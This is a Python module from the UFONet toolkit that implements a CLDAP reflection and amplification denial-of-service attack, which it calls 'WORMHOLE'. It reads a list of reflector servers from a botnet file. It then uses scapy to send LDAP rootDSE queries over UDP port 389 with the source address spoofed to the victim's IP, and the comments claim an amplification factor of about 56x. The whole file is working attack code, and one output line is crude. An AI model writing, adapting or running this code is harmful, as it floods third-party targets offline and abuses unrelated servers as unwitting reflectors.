#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
from urllib.parse import urlparse
try:
    from scapy.all import *
except ImportError:
    from core._ensure import ensure
    if ensure('scapy.all', 'scapy') is None:
        print("\nError importing: scapy lib.\n")
        sys.exit(2)
    from scapy.all import *

cldap_file = "botnet/cldap.txt"

# UFONet CLDAP Amplification (WORMHOLE) - amp factor ~56x (LDAP rootDSE searchRequest)
def wormholize(ip, rounds):
    n=0
    try:
        from core._botnet import load_botnet_file, warn_placeholders
        reflectors, _empty, _all_placeholder = load_botnet_file(cldap_file)
        if _empty:
            print("[Error] [AI] [WORMHOLE] botnet/cldap.txt is empty -> [Aborting!]")
            return
        if _all_placeholder:
            warn_placeholders("WORMHOLE", cldap_file, kind="cldap")
            return
        payload = (b'\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24'
                   b'\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01'
                   b'\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73'
                   b'\x30\x00')
        for x in range(int(rounds)):
            n += 1
            print("[Info] [AI] [WORMHOLE] Bending 'spacetime' ["+str(n)+"] toward target! -> [SLOWING!]")
            for r in reflectors:
                try:
                    sport = random.randint(2000, 65535)
                    packet = IP(dst=r, src=ip) / UDP(sport=sport, dport=389) / Raw(load=payload)
                    send(packet, verbose=0)
                    print("[Info] [AI] [WORMHOLE] Bent 'spacetime' ["+str(n)+"] IS INTERACTING WITH ["+r+"] -> [AMPLIFYING!]")
                except:
                    print("[Info] [AI] [WORMHOLE] Bent 'spacetime' ["+str(n)+"] FAILED to reach ["+r+"] -> [PASSING!]")
    except:
        print("[Error] [AI] [WORMHOLE] Failing to engage... -> Is still target online? -> [Checking!]")

class CLDAP(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] CLDAP Amplification (WORMHOLE) is ready to fire: [", rounds, "spacetimes ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                url = urlparse(target)
                a = r.resolve(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [WORMHOLE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        wormholize(ip, rounds)
